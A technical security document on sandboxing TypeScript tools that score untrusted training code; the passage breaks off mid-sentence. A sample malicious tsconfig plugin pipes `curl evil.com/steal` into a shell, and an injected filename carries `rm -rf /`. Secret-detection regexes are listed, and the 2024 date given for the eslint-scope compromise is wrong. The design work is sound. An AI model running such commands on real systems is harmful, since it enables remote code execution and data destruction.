# Security Architecture: Running Untrusted Code Without Getting Owned

Training an ML model on code from the internet means running tools on code from
the internet. When you invoke `tsc --noEmit` on a random TypeScript file from
HuggingFace, you are running the TypeScript compiler on code that was written
by a stranger. When you invoke `eslint` on that file, you are loading ESLint's
parser against content you did not author. This is a real attack surface, not
a theoretical one.

In 2023, researchers discovered malicious Python packages on PyPI that installed
cryptocurrency miners. In 2024, the eslint-scope npm package was compromised
in a supply-chain attack that stole npm tokens. In 2022, malicious Jupyter
notebooks on HuggingFace executed arbitrary code when loaded. If it can happen
to curated repositories, it can definitely happen to your training data.

This document covers every layer of security in the scoring pipeline: sandbox
modes, the TscRunner's SOLID design, the hardened tsconfig, credential
scanning, audit logging, and the threat model.

**TypeScript analogy:** Think of this security architecture as a CI pipeline
where every check runs in an isolated container. You would not run `npm test`
from a random PR directly on your production server. Same principle --- the
scoring pipeline runs external tools in isolation, with no network access,
limited resources, and comprehensive logging.

---

## Table of Contents

1. [Why Security Matters for ML Training](#1-why-security-matters-for-ml-training)
2. [Three Security Modes](#2-three-security-modes)
3. [SandboxedRunner Deep Dive](#3-sandboxedrunner-deep-dive)
4. [TscRunner --- SOLID Architecture](#4-tscrunner--solid-architecture)
5. [Credential Scanner](#5-credential-scanner)
6. [Audit Logging](#6-audit-logging)
7. [Configuration](#7-configuration)
8. [Security Enforcement Tests](#8-security-enforcement-tests)
9. [Threat Model](#9-threat-model)
10. [Adding Security to Custom Scorers](#10-adding-security-to-custom-scorers)
11. [What Happens When --- Security Scenarios](#11-what-happens-when--security-scenarios)
12. [Common Mistakes and Debugging](#12-common-mistakes-and-debugging)

---

## 1. Why Security Matters for ML Training

When you score training data, you are running external tools (tsc, eslint) on
code that anyone could have uploaded to GitHub or HuggingFace. Here is a
non-exhaustive list of real attacks that this pipeline defends against:

### The TypeScript Compiler Plugin Attack

tsc supports [compiler plugins](https://www.typescriptlang.org/tsconfig#plugins)
--- arbitrary JavaScript code that runs during compilation. A malicious
tsconfig.json in training data could contain:

```json
{
  "compilerOptions": {
    "plugins": [{
      "name": "./evil-plugin",
      "transform": "module.exports = (program) => { require('child_process').exec('curl evil.com/steal | sh'); }"
    }]
  }
}
```

If our scorer used the file's own tsconfig, this plugin would execute during
`tsc --noEmit`. Our defense: write our own **hardened tsconfig** with
`plugins: []` (see Section 4).

### The @types Package Attack

TypeScript automatically resolves type definitions from `@types/*` packages
via the `typeRoots` compiler option. A malicious repository could include a
`node_modules/@types/` directory with arbitrary code in `.d.ts` files that
TypeScript loads during compilation. Our defense: `types: []` and
`typeRoots: []` in the hardened tsconfig.

### The Credential Exfiltration Risk

Training data scraped from GitHub regularly contains hardcoded credentials:
AWS access keys, API tokens, database connection strings. If this code is
sent to an external LLM API for annotation (the LLM-as-Judge pipeline), you
are effectively forwarding secrets to a third party. Our defense: the
`CredentialScanner` strips or rejects code with detected secrets before it
reaches any API.

### The Resource Exhaustion Attack

A carefully crafted TypeScript file can cause tsc to consume exponential
memory or CPU during type inference (this is a known class of issues in
TypeScript). Without timeouts and memory limits, a single malicious file
could hang your scoring pipeline indefinitely. Our defense: per-process
timeouts and Docker memory limits.

---

## 2. Three Security Modes

**File:** `src/cola_coder/data/scorers/security.py`

The scoring pipeline supports three security modes, configured via
`scoring.yaml`:

```python
class SecurityMode(str, Enum):
    OFF = "off"         # Trust all data, no isolation
    NATIVE = "native"   # Temp dir isolation + timeout + CREATE_NO_WINDOW
    DOCKER = "docker"   # Full container isolation
```

### Mode: off

No security whatsoever. Tools run directly on the filesystem with full access
to the host. Only appropriate for scoring data you trust completely (e.g.,
your own codebase). Do not use this for internet-sourced data.

### Mode: native (default)

Provides meaningful isolation without requiring Docker:

- **Temp directory isolation** --- code is written to a fresh temp directory.
  Tools run with that temp directory as their working directory. No access to
  parent directories (the tool process has no reason to look elsewhere).
- **Timeouts** --- every subprocess call has a configurable timeout (default:
  10 seconds). If a tool hangs, the process is killed.
- **CREATE_NO_WINDOW** --- on Windows, processes are created with the
  `0x08000000` flag, preventing console windows from popping up during batch
  scoring.
- **No shell=True** --- all subprocess calls use argument lists, preventing
  shell injection.

Native mode is the right default for development and most production use. It
stops accidental damage and resource exhaustion but does not provide kernel-level
isolation.

### Mode: docker

Maximum isolation via Docker containers:

- **No network** --- `--network none` prevents any outbound connections.
- **Read-only filesystem** --- `--read-only` prevents writing to the container's
  root filesystem. A small writable tmpfs is mounted at `/tmp`.
- **All capabilities dropped** --- `--cap-drop ALL` removes all Linux
  capabilities (no raw sockets, no mount, no ptrace).
- **PID limit** --- `--pids-limit 64` prevents fork bombs.
- **Memory limit** --- configurable (default 512 MB).
- **Run as nobody** --- `--user 65534:65534` (nobody/nogroup).
- **No privilege escalation** --- `--security-opt no-new-privileges`.
- **Code mounted read-only** --- `-v ${cwd}:/work:ro`.

Docker mode is recommended for production scoring of untrusted data from the
internet. It provides kernel-level isolation similar to what CI/CD systems use
for untrusted builds.

```yaml
scoring:
  security:
    mode: "docker"
    require_docker: true    # Refuse to run if Docker is unavailable
    docker_image: "node:20-alpine"
    docker:
      pids_limit: 64
      cap_drop: ["ALL"]
      network: "none"
      read_only: true
      tmpfs_size_mb: 64
```

---

## 3. SandboxedRunner Deep Dive

**File:** `src/cola_coder/data/scorers/sandbox.py`

`SandboxedRunner` is the single execution gateway for all external tool
invocations in the scoring pipeline. Every tsc and eslint call goes through
`SandboxedRunner.run()`. There is no backdoor, no alternative execution path.

### Construction

```python
class SandboxedRunner:
    def __init__(
        self,
        use_docker: bool = False,
        timeout: int = 10,
        memory_mb: int = 512,
        docker_image: str = "node:20-alpine",
    ) -> None:
        self.use_docker = use_docker and self._docker_available()
        self.timeout = timeout
        self.memory_mb = memory_mb
        self.docker_image = docker_image
```

Note the `and self._docker_available()` --- if Docker is requested but not
available, the runner silently falls back to native mode. If you need Docker
mode to be mandatory, use `require_docker: true` in the config, which makes
`verify_or_fail()` raise a `SecurityError` if Docker is unavailable.

### The from_config() Factory

The recommended way to construct a runner is from a `SecurityConfig`:

```python
runner = SandboxedRunner.from_config(security_cfg, audit_logger=audit_logger)
runner.verify_or_fail()
```

This wires up the correct mode, timeout, memory limits, Docker image, and
audit logger in one call. The `verify_or_fail()` method is a hard check ---
call it at startup, not per-invocation.

### Native Execution Path

```python
def _run_native(self, cmd, cwd, capture_output):
    kwargs = {
        "cwd": cwd,
        "capture_output": capture_output,
        "text": True,
        "timeout": self.timeout,
    }
    if sys.platform == "win32":
        kwargs["creationflags"] = 0x08000000  # CREATE_NO_WINDOW

    return subprocess.run(cmd, **kwargs)
```

Key security properties:

1. **No `shell=True`.** Commands are passed as argument lists, not shell
   strings. This prevents injection attacks where malicious filenames contain
   shell metacharacters (e.g., `file; rm -rf /`).

2. **Timeout enforcement.** Every call has a hard timeout. If the process
   exceeds it, Python raises `TimeoutExpired`. On Windows, the runner
   additionally calls `_kill_process_tree()` to clean up child processes.

3. **Isolated working directory.** The `cwd` parameter is always a temp
   directory containing only the files being scored. The tool process starts
   in that directory and has no reason to access anything outside it.

4. **Error containment.** Both `TimeoutExpired` and `FileNotFoundError` are
   caught and converted to `CompletedProcess` objects with negative return
   codes (-1 for timeout, -2 for missing command). The scorer receives a
   structured failure, not an exception.

### Docker Execution Path

```python
def _run_docker(self, cmd, cwd, capture_output):
    docker_cmd = [
        "docker", "run",
        "--rm",                              # Auto-remove container
        "--network", "none",                 # No network access
        f"--memory={self.memory_mb}m",       # Memory limit
        "--read-only",                       # Read-only root filesystem
        "--tmpfs", "/tmp:rw,size=64m",       # Small writable tmp
        "--pids-limit", "64",                # Prevent fork bombs
        "--cap-drop", "ALL",                 # Drop all capabilities
        "--security-opt", "no-new-privileges",
        "--user", "65534:65534",             # Run as nobody
        "-v", f"{cwd}:/work:ro",             # Mount code read-only
        "-w", "/work",                       # Working directory
        self.docker_image,
        *cmd,
    ]
```

Let us walk through each flag:

| Flag | What It Does | What It Prevents |
|------|-------------|-----------------|
| `--rm` | Delete container after exit | Container accumulation from crash loops |
| `--network none` | No networking at all | Data exfiltration, C2 callbacks |
| `--memory 512m` | Hard memory limit | Memory exhaustion attacks |
| `--read-only` | Immutable root filesystem | Persistent malware, file modification |
| `--tmpfs /tmp:rw,size=64m` | Small writable scratch space | Needed by tsc/eslint for temp files |
| `--pids-limit 64` | Max 64 processes | Fork bombs |
| `--cap-drop ALL` | No Linux capabilities | Privilege escalation, raw socket access |
| `--no-new-privileges` | Cannot gain new privileges | setuid/setgid exploitation |
| `--user 65534:65534` | Run as nobody | Root-level operations |
| `-v ${cwd}:/work:ro` | Code mounted read-only | Modification of scoring inputs |

The timeout for Docker mode adds 10 seconds to account for container startup:

```python
"timeout": self.timeout + 10,  # Extra time for Docker overhead
```

### Stale Temp Cleanup

If a scoring run crashes, temp directories may be left behind. The
`cleanup_stale_temps()` static method removes them:

```python
@staticmethod
def cleanup_stale_temps(prefix="cola_"):
    tmpdir = tempfile.gettempdir()
    stale = glob.glob(os.path.join(tmpdir, f"{prefix}*"))
    for path in stale:
        if os.path.isdir(path):
            shutil.rmtree(path)
```

This is called automatically during `build_composite_scorer()`.

---

## 4. TscRunner --- SOLID Architecture

**File:** `src/cola_coder/reasoning/rewards/tsc_runner.py`

TscRunner is the most security-critical component in the scoring pipeline.
It runs the TypeScript compiler --- a complex tool that can execute arbitrary
code via plugins --- on untrusted input. The design follows SOLID principles
to ensure there is exactly one code path for all tsc execution.

### Why tsc Is Dangerous

The TypeScript compiler is not just a type checker. It is a programmable
compiler with plugin support. When you run `tsc --project .`, it reads
`tsconfig.json` from the project directory, and that tsconfig can specify:

1. **Compiler plugins** --- JavaScript modules that run inside the compiler
   process with full Node.js access. A plugin can execute arbitrary code,
   access the filesystem, make network requests, and spawn child processes.

2. **Type roots** (`typeRoots`) --- directories from which tsc automatically
   loads type declarations. A malicious `@types` directory could contain
   `.d.ts` files with embedded `declare global` blocks that affect compilation.

3. **Path mappings** (`paths`, `baseUrl`) --- remap import paths. A malicious
   config could redirect imports to files outside the temp directory.

None of these are bugs in TypeScript. They are intended features. But when
processing untrusted code, every one of them is an attack vector.

### The Hardened tsconfig

**File:** `src/cola_coder/data/scorers/tsconfig_factory.py`

TscRunner never uses the file's own tsconfig. It generates a hardened one:

```python
def create_hardened_tsconfig(strict=True, include_files=None):
    return {
        "compilerOptions": {
            "strict": strict,
            "noEmit": True,
            "target": "ES2022",
            "module": "ESNext",
            "moduleResolution": "bundler",
            "skipLibCheck": True,
            "plugins": [],       # SECURITY: no plugin execution
            "types": [],         # SECURITY: no @types resolution
            "typeRoots": [],     # SECURITY: no type root scanning
            # No "paths" or "baseUrl" -- prevents path traversal
        },
        "include": include_files or ["*.ts"],
        "exclude": ["node_modules", "**/*.js", "**/*.cjs", "**/*.mjs"],
    }
```

Every security-relevant field is explicitly set:

| Field | Value | Threat Neutralized |
|-------|-------|--------------------|
| `plugins: []` | No plugins loaded | Arbitrary code execution via compiler plugins |
| `types: []` | No @types packages | Malicious type declarations |
| `typeRoots: []` | No type root directories | Poisoned node_modules/@types |
| No `paths` | No path remapping | Path traversal outside temp dir |
| No `baseUrl` | No base URL resolution | Path traversal outside temp dir |
| `include: ["check.ts"]` | Explicit file list | Wildcards matching injected files |
| `skipLibCheck: true` | Skip .d.ts checking | Avoids loading declaration files |
| `noEmit: true` | No output files | Prevents writing to filesystem |

### Single Execution Path

TscRunner is used by both the scoring pipeline (TscScorer) and the RL training
reward system (TypeCheckReward). Both use the same class, the same hardened
tsconfig, and the same SandboxedRunner. There is no "fast path" that skips
security for convenience.

```
TscScorer (data scoring)   ----\
                                +--> TscRunner --> SandboxedRunner --> subprocess
TypeCheckReward (RL training) -/
```

This is the SOLID Single Responsibility principle in action: TscRunner's single
job is to run tsc safely. It does not know about scores, rewards, or training.
It just runs tsc and returns structured errors.

### The Execution Flow

```python
def check(self, code):
    code_hash = hashlib.md5(code.encode("utf-8")).hexdigest()

    # 1. Check LRU cache
    if code_hash in self._cache:
        return self._cache[code_hash]

    with tempfile.TemporaryDirectory(prefix="cola_tsc_") as tmpdir:
        # 2. Write code to temp file
        (Path(tmpdir) / "check.ts").write_text(code)

        # 3. Write hardened tsconfig
        tsconfig = create_hardened_tsconfig(strict=self._strict, include_files=["check.ts"])
        (Path(tmpdir) / "tsconfig.json").write_text(json.dumps(tsconfig))

        # 4. Run through SandboxedRunner
        result = self._runner.run(
            [self._tsc_path, "--project", ".", "--pretty", "false"],
            cwd=tmpdir,
            label="tsc",
            file_hash=code_hash,
        )

        # 5. Parse errors
        errors = self._parse_errors(result.stdout + result.stderr)

        # 6. Cache result
        self._cache[code_hash] = errors
        return errors
```

Key details:

- **MD5 caching.** The same code always produces the same tsc output. The LRU
  cache (default 256 entries) avoids re-running tsc on duplicate code samples.
  This is especially valuable in RL training where the model generates similar
  code repeatedly.

- **Explicit include list.** The tsconfig's `include` field names only the
  specific file(s) we wrote. No wildcards that could match injected files.

- **--pretty false.** Disables ANSI color codes in tsc output, making regex
  parsing reliable.

- **Batch mode.** `check_batch()` writes multiple files and includes all of
  them in a single tsconfig. One tsc invocation for N files instead of N
  invocations.

### Error Parsing

TscRunner parses tsc's text output into structured `TscError` objects:

```python
_ERROR_PATTERN = re.compile(
    r"^(.+?)\((\d+),(\d+)\):\s+(error|warning)\s+(TS\d+):\s+(.+)$",
    re.MULTILINE,
)
```

This matches lines like:

```
check.ts(5,10): error TS2322: Type 'string' is not assignable to type 'number'.
```

Each match produces a `TscError` with file, line, column, severity, code, and
message. The TscScorer then uses the error count and error codes to compute a
score.

---

## 5. Credential Scanner

**File:** `src/cola_coder/data/scorers/credential_scanner.py`

The `CredentialScanner` detects hardcoded secrets in code before it is sent to
external LLM APIs. This is critical for the LLM-as-Judge pipeline, where code
samples are sent to Claude or Ollama for annotation.

### 20+ Detection Patterns

The scanner includes patterns for the most common secret types:

**Cloud Provider Keys:**
- AWS Access Keys (`AKIA[0-9A-Z]{16}`)
- AWS Secret Keys (key-value pattern)

**API Tokens:**
- GitHub Personal Access Tokens (`ghp_...`)
- GitHub OAuth Tokens (`gho_...`)
- GitHub Fine-Grained PATs (`github_pat_...`)
- OpenAI API Keys (`sk-...48 chars`)
- Anthropic API Keys (`sk-ant-...`)
- Slack Bot/User Tokens (`xoxb-...`, `xoxp-...`)

**OAuth / JWT:**
- Google OAuth Tokens (`ya29....`)
- JWT Tokens (the `eyJ...` three-part format)
- Bearer Tokens

**Database Connection Strings:**
- MongoDB (`mongodb://...` and `mongodb+srv://...`)
- PostgreSQL (`postgres://...` and `postgresql://...`)
- MySQL, Redis, MSSQL

**Cryptographic Material:**
- Private Keys (`-----BEGIN RSA PRIVATE KEY-----`)
- Certificates (`-----BEGIN CERTIFICATE-----`)

**Payment:**
- Stripe Secret Keys (`sk_live_...`)
- Stripe Restricted Keys (`rk_live_...`)

**Generic Secrets:**
- High-confidence key-value patterns (`password = "..."`, `api_key = "..."`)

### Four Operating Modes

```python
class CredentialScanner:
    """
    Modes:
        off:    No scanning, pass through unchanged.
        warn:   Detect and return findings, but pass code through.
        strip:  Replace detected secrets with [REDACTED] (default).
        reject: Return None if any credential is found.
    """
```

**off** --- No scanning. Fast but dangerous for the LLM-as-Judge pipeline.
Appropriate only when you know your data has already been scrubbed.

**warn** --- Scan and record findings, but pass the code through unchanged.
Useful for auditing --- you want to know what secrets are in your data without
blocking the pipeline.

**strip (default)** --- Replace every detected secret with `[REDACTED]`. The
code can still be scored and annotated; the LLM just sees `[REDACTED]` where
the API key was. This is the right default because it preserves the code
structure while removing the dangerous content.

**reject** --- If any credential is detected, the entire code sample is
dropped (returns `None`). The most aggressive mode. Use this when you cannot
afford even the risk of a false negative in the strip patterns.

### How Scanning Works

```python
def scan(self, code: str) -> ScanResult:
    findings = []
    lines = code.split("\n")

    for line_num, line in enumerate(lines, 1):
        for pattern, name in self._compiled:
            for match in pattern.finditer(line):
                matched_text = match.group(0)
                # Mask for safe logging
                if len(matched_text) > 8:
                    masked = matched_text[:4] + "****" + matched_text[-4:]
                else:
                    masked = "****"
                findings.append(CredentialFinding(
                    pattern_name=name,
                    line_number=line_num,
                    masked_match=masked,
                ))

    return ScanResult(has_credentials=len(findings) > 0, findings=findings)
```

Key design decisions:

- **Line-by-line scanning** for accurate line number reporting in audit logs.
- **Masked matches** in findings --- the log shows `AKIA****XXXX`, not the
  actual key. The scanner never stores full credentials.
- **All patterns are pre-compiled** in `__init__()` for performance.
- **Extensible** via `extra_patterns` constructor parameter.

### Integration Points

The credential scanner is integrated at two points:

1. **LLM-as-Judge annotation** --- `LlmJudge.score()` and
   `LlmJudge.annotate_batch()` run the scanner before sending code to the LLM
   API. In strip mode, the LLM sees `[REDACTED]` instead of actual secrets. In
   reject mode, the sample is skipped entirely.

2. **Registry construction** --- `build_composite_scorer()` constructs a
   `CredentialScanner` from the config and passes it to the LlmJudge scorer.

The credential scanner is NOT used by tsc or eslint --- those tools run
locally and do not send code to external APIs. The security for those tools
comes from SandboxedRunner isolation.

---

## 6. Audit Logging

**File:** `src/cola_coder/data/scorers/audit.py`

Every external tool invocation is logged to an append-only JSONL file. This
provides a complete forensic record of what commands were executed, on what
code, with what results.

### The Audit Entry Schema

```python
@dataclass
class AuditEntry:
    timestamp: str = ""          # ISO 8601 UTC
    scorer: str = ""             # "tsc", "eslint", "tsc_batch"
    file_hash: str = ""          # MD5 of the code being scored
    security_mode: str = ""      # "native" or "docker"
    command: list[str] = []      # First 5 elements of the command
    exit_code: int = 0           # Process exit code
    duration_ms: float = 0.0     # Execution time
    security_events: list[str] = []  # Special events
```

### Example Audit Log

```jsonl
{"timestamp":"2026-03-26T08:15:42.123456+00:00","scorer":"tsc","file_hash":"a1b2c3d4","security_mode":"native","command":["tsc","--project",".","--pretty","false"],"exit_code":0,"duration_ms":847.3,"security_events":[]}
{"timestamp":"2026-03-26T08:15:43.987654+00:00","scorer":"eslint","file_hash":"e5f6g7h8","security_mode":"native","command":["eslint","--format","json","--no-eslintrc"],"exit_code":1,"duration_ms":1234.5,"security_events":[]}
{"timestamp":"2026-03-26T08:15:44.111111+00:00","scorer":"","file_hash":"i9j0k1l2","security_mode":"","command":[],"exit_code":0,"duration_ms":0.0,"security_events":["credential_stripped:AWS Access Key:line 42"]}
```

### Security Events

The audit logger has a dedicated method for security events:

```python
def log_security_event(self, event, scorer="", file_hash=""):
    entry = AuditEntry(
        scorer=scorer,
        file_hash=file_hash,
        security_events=[event],
    )
    self.log(entry)
```

Security events include:

- `credential_stripped:<pattern_name>:line <N>` --- a credential was detected
  and replaced with `[REDACTED]`.
- `credential_rejected:<pattern_name>:line <N>` --- a code sample was rejected
  due to credentials (in reject mode).
- `timeout:<scorer>:<duration_ms>` --- a scorer hit its timeout limit.
- `docker_unavailable` --- Docker mode was requested but Docker is not running.

### Thread Safety

The audit logger uses file-level append operations:

```python
def log(self, entry):
    with open(self._path, "a", encoding="utf-8") as f:
        f.write(json.dumps(asdict(entry)) + "\n")
```

On most operating systems, writes under 4 KB are atomic when appending to a
file. Each audit entry is well under this limit (typically 200--500 bytes),
so concurrent writes from different scorers will not interleave.

### Forensics Workflow

When something goes wrong --- a scoring run produces unexpected results, a
file appears compromised, or a credential leak is suspected --- the audit log
is your primary investigation tool.

**Find all tsc timeouts:**

```bash
grep '"exit_code":-1' logs/scoring_audit.jsonl | grep '"scorer":"tsc"'
```

**Find all credential detections:**

```bash
grep 'credential_stripped\|credential_rejected' logs/scoring_audit.jsonl
```

**Find all Docker failures:**

```bash
grep 'docker_unavailable\|"exit_code":-2' logs/scoring_audit.jsonl
```

**Correlate a specific file hash:**

```bash
grep '"file_hash":"a1b2c3d4"' logs/scoring_audit.jsonl
```

This shows every operation performed on that specific code sample --- useful for
understanding why a file received a particular score.

---

## 7. Configuration

**File:** `configs/scoring.yaml`

The security section of `scoring.yaml` controls all security settings:

```yaml
scoring:
  security:
    # Core mode selection
    mode: "native"              # off | native | docker
    require_docker: false       # Hard fail if Docker unavailable?
    timeout: 10                 # Seconds per scoring operation
    memory_mb: 512              # Docker memory limit

    # Docker image
    docker_image: "node:20-alpine"

    # Audit logging
    audit_log: "logs/scoring_audit.jsonl"

    # Credential scanning
    credential_scan:
      mode: "strip"             # off | warn | strip | reject

    # Docker-specific settings (only used when mode=docker)
    docker:
      pids_limit: 64            # Max processes in container
      cap_drop: ["ALL"]         # Linux capabilities to drop
      network: "none"           # Container network mode
      read_only: true           # Read-only root filesystem
      tmpfs_size_mb: 64         # Writable /tmp size
```

### Configuration Profiles

**Development (fast, low security):**

```yaml
security:
  mode: "native"
  timeout: 5
  credential_scan:
    mode: "warn"
```

**Production (full isolation):**

```yaml
security:
  mode: "docker"
  require_docker: true
  timeout: 15
  memory_mb: 1024
  credential_scan:
    mode: "strip"
```

**Maximum security (for public-facing services):**

```yaml
security:
  mode: "docker"
  require_docker: true
  timeout: 10
  memory_mb: 512
  credential_scan:
    mode: "reject"    # Drop any file with detected credentials
  docker:
    pids_limit: 32    # Tighter PID limit
    tmpfs_size_mb: 32 # Smaller writable space
```

### Backward Compatibility

The security config supports the old `sandbox` key for backward compatibility:

```yaml
# Old format (still works)
scoring:
  sandbox:
    use_docker: false
    timeout: 10
    memory_mb: 512
```

`SecurityConfig.from_dict()` checks for the new `security` key first, then
falls back to the old `sandbox` key:

```python
@staticmethod
def from_dict(cfg):
    security = cfg.get("security", {})
    if not security:
        # Backward compat: fall back to old 'sandbox' key
        sandbox = cfg.get("sandbox", {})
        if sandbox:
            use_docker = sandbox.get("use_docker", False)
            return SecurityConfig(
                mode=SecurityMode.DOCKER if use_docker else SecurityMode.NATIVE,
                timeout=sandbox.get("timeout", 10),
                memory_mb=sandbox.get("memory_mb", 512),
            )
```

---

## 8. Security Enforcement Tests

The security architecture is verified by a suite of tests that confirm each
layer works correctly. Here are the key test patterns:

### Testing SandboxedRunner

```python
def test_native_mode_respects_timeout():
    """A command that exceeds the timeout should be killed."""
    runner = SandboxedRunner(timeout=1)
    # Run a command that sleeps for 10 seconds
    result = runner.run(["sleep", "10"], cwd="/tmp")
    assert result.returncode == -1
    assert "Timeout" in result.stderr

def test_docker_mode_no_network():
    """Docker mode should not allow network access."""
    runner = SandboxedRunner(use_docker=True, timeout=5)
    result = runner.run(
        ["curl", "-s", "https://httpbin.org/get"],
        cwd="/tmp",
    )
    # Should fail because --network none blocks all networking
    assert result.returncode != 0

def test_docker_mode_read_only():
    """Docker mode should not allow writing to the root filesystem."""
    runner = SandboxedRunner(use_docker=True, timeout=5)
    result = runner.run(
        ["sh", "-c", "echo test > /etc/test"],
        cwd="/tmp",
    )
    assert result.returncode != 0
```

### Testing Hardened tsconfig

```python
def test_hardened_tsconfig_blocks_plugins():
    """Hardened tsconfig must have plugins=[] to prevent code execution."""
    config = create_hardened_tsconfig()
    assert config["compilerOptions"]["plugins"] == []

def test_hardened_tsconfig_blocks_types():
    """Hardened tsconfig must have types=[] to prevent @types loading."""
    config = create_hardened_tsconfig()
    assert config["compilerOptions"]["types"] == []

def test_hardened_tsconfig_no_paths():
    """Hardened tsconfig must not include paths or baseUrl."""
    config = create_hardened_tsconfig()
    assert "paths" not in config["compilerOptions"]
    assert "baseUrl" not in config["compilerOptions"]
```

### Testing Credential Scanner

```python
def test_scanner_detects_aws_key():
    code = 'const key = "AKIAIOSFODNN7EXAMPLE";'
    scanner = CredentialScanner(mode="warn")
    result = scanner.scan(code)
    assert result.has_credentials
    assert result.findings[0].pattern_name == "AWS Access Key"

def test_scanner_strip_mode():
    code = 'const key = "AKIAIOSFODNN7EXAMPLE";'
    scanner = CredentialScanner(mode="strip")
    processed = scanner.process(code)
    assert "AKIAIOSFODNN7EXAMPLE" not in processed
    assert "[REDACTED]" in processed

def test_scanner_reject_mode():
    code = 'const key = "AKIAIOSFODNN7EXAMPLE";'
    scanner = CredentialScanner(mode="reject")
    processed = scanner.process(code)
    assert processed is None

def test_scanner_off_mode():
    code = 'const key = "AKIAIOSFODNN7EXAMPLE";'
    scanner = CredentialScanner(mode="off")
    processed = scanner.process(code)
    assert processed == code  # Unchanged
```

### Testing TscRunner Security

```python
def test_tscrunner_never_uses_file_tsconfig():
    """TscRunner must always write its own hardened tsconfig."""
    runner = TscRunner()
    # Even if the temp dir has a tsconfig.json, TscRunner overwrites it
    with tempfile.TemporaryDirectory() as tmpdir:
        malicious_config = {
            "compilerOptions": {
                "plugins": [{"name": "evil"}]
            }
        }
        (Path(tmpdir) / "tsconfig.json").write_text(json.dumps(malicious_config))

        # After TscRunner writes its config, plugins should be []
        # (verified by reading the file after check() runs)
```

---

## 9. Threat Model

### What the Security Architecture Prevents

| Threat | Defense | Mode Required |
|--------|---------|---------------|
| tsc compiler plugin execution | Hardened tsconfig (`plugins: []`) | native |
| @types package code loading | Hardened tsconfig (`types: []`, `typeRoots: []`) | native |
| Path traversal via tsconfig | No `paths` or `baseUrl` in tsconfig | native |
| Wildcard file inclusion | Explicit `include` file list | native |
| Shell injection | No `shell=True` in subprocess calls | native |
| Resource exhaustion (CPU) | Per-process timeout | native |
| Console window spam (Windows) | `CREATE_NO_WINDOW` flag | native |
| Network data exfiltration | `--network none` | docker |
| Persistent malware | `--read-only` filesystem | docker |
| Fork bombs | `--pids-limit 64` | docker |
| Memory exhaustion | `--memory 512m` | docker |
| Privilege escalation | `--cap-drop ALL`, `--user nobody` | docker |
| Credential leakage to LLM APIs | `CredentialScanner` (strip/reject) | all modes |
| Silent failures | Audit logging | all modes |

### What the Security Architecture Does NOT Prevent

Be honest about limitations:

1. **Side-channel attacks.** A malicious file could infer information about
   the host system from tsc's behavior (timing, error messages). This is
   mitigated in Docker mode but not eliminated.

2. **Docker escape exploits.** If there is a 0-day Docker escape vulnerability,
   container isolation can be bypassed. This is an industry-wide risk, not
   specific to cola-coder.

3. **Denial of service via valid code.** A TypeScript file with deeply nested
   conditional types can cause tsc to use exponential time within the timeout
   limit. The file will time out and get a low score, but it still consumes
   resources.

4. **False negatives in credential scanning.** The scanner uses regex patterns.
   A sufficiently obfuscated credential (base64 encoded, split across
   variables) will not be detected. The scanner catches the common patterns,
   not all possible encodings.

5. **Supply chain attacks on tsc/eslint themselves.** If the installed tsc or
   eslint binary is compromised, the sandbox cannot help. Use verified
   installations and pin versions.

6. **Data poisoning.** A malicious actor could craft training data that causes
   the model to learn specific vulnerabilities. The security architecture
   protects the training infrastructure, not the trained model's behavior.

---

## 10. Adding Security to Custom Scorers

If you implement a custom scorer (see the
[Data Quality Scoring Pipeline deep dive](data-quality-scoring-pipeline.md),
Section 11), here is how to integrate with the security architecture:

### If Your Scorer Runs External Tools

Accept a `SandboxedRunner` in the constructor and use it for all subprocess
calls:

```python
class MyToolScorer:
    name: str = "my_tool"

    def __init__(self, runner: SandboxedRunner | None = None) -> None:
        self._runner = runner or SandboxedRunner(timeout=10)

    def score(self, code, metadata=None):
        with tempfile.TemporaryDirectory() as tmpdir:
            # Write code to temp file
            filepath = Path(tmpdir) / "code.ts"
            filepath.write_text(code)

            # Run tool through SandboxedRunner
            result = self._runner.run(
                ["my-tool", "--check", str(filepath)],
                cwd=tmpdir,
                label=self.name,
            )
            # Parse result...
```

Register it in `_instantiate_scorer()` with the shared runner:

```python
elif name == "my_tool":
    from my_scorer import MyToolScorer
    return MyToolScorer(runner=runner)
```

### If Your Scorer Calls External APIs

Accept a `CredentialScanner` and process code before sending it:

```python
class MyApiScorer:
    def __init__(self, scanner: CredentialScanner | None = None) -> None:
        self._scanner = scanner

    def score(self, code, metadata=None):
        if self._scanner:
            processed = self._scanner.process(code)
            if processed is None:
                return ScorerResult(score=0.5, scorer_name=self.name,
                                    details={"skipped": "credential_detected"})
            code = processed

        # Now safe to send to external API
        response = self._call_api(code)
        ...
```

### If Your Scorer Is Pure Python

No special security integration needed. Pure Python scorers (like
HeuristicScorer and StarsScorer) do not execute external code and do not send
data to external APIs. They are inherently safe.

---

## 11. What Happens When --- Security Scenarios

### Scenario: A malicious tsconfig.json is in the training data

**What happens:** TscRunner ignores it completely. It writes its own hardened
tsconfig to the temp directory, overwriting any existing one. The malicious
config is never read by tsc.

**Audit trail:** No special event --- this is the normal execution path.

### Scenario: A TypeScript file causes tsc to hang

**What happens:** SandboxedRunner's timeout fires after 10 seconds. The tsc
process is killed. On Windows, `_kill_process_tree()` ensures child processes
are cleaned up. TscRunner receives a `CompletedProcess` with `returncode=-1`.
The file gets a low score (0.1 from the fallback).

**Audit trail:** `{"scorer":"tsc","exit_code":-1,"duration_ms":10003.2,...}`

### Scenario: A code sample contains an AWS access key

**What happens (strip mode):** CredentialScanner detects the pattern, replaces
`AKIAIOSFODNN7EXAMPLE` with `[REDACTED]`. The redacted code is sent to the LLM
for annotation. The original key is never transmitted.

**Audit trail:**
`{"security_events":["credential_stripped:AWS Access Key:line 42"],...}`

### Scenario: Docker is required but not running

**What happens:** `SandboxedRunner.verify_or_fail()` raises a `SecurityError`
with a descriptive message. The entire scoring pipeline refuses to start. No
partial scoring with degraded security.

**Error message:**
```
SecurityError: Docker is required (security.require_docker=true) but not
available. Install/start Docker Desktop or set require_docker=false.
```

### Scenario: eslint is not installed

**What happens:** `EslintScorer.is_available()` returns False. The registry
skips the scorer. The CompositeScorer automatically renormalizes the remaining
scorer weights. All files get eslint score=0.5 (neutral).

**User-visible:** The `score_data.py` CLI shows:
```
Available scorers:
  + tsc (weight=0.3, enabled)
  - eslint (weight=0.2, enabled)     # <-- shows as unavailable
  + stars (weight=0.15, enabled)
  + heuristic (weight=0.2, enabled)
```

---

## 12. Common Mistakes and Debugging

### "Docker mode is slow"

Docker adds ~2--5 seconds overhead per invocation (image pull check + container
startup + teardown). For development, use `mode: native`. For production
scoring of large datasets, the overhead amortizes: 2 seconds per file across
